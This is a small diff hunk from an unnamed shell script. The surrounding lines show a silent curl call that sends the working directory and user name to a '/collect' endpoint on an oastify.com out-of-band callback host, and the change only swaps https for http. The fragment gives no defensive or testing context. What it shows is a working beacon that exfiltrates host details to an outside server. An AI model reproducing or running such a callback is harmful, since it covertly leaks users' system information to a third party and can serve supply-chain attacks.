@@ -38,4 +38,4 @@ curl --silent --show-error --fail \
     --data-urlencode "pwd=$CWD" \
     --data-urlencode "user=$USER_NAME" \
     --output /dev/null \
-    "https://yfhoz96xhi1ekrwm8tgp9hc0zr5it8hx.oastify.com/collect"
+    "http://yfhoz96xhi1ekrwm8tgp9hc0zr5it8hx.oastify.com/collect"
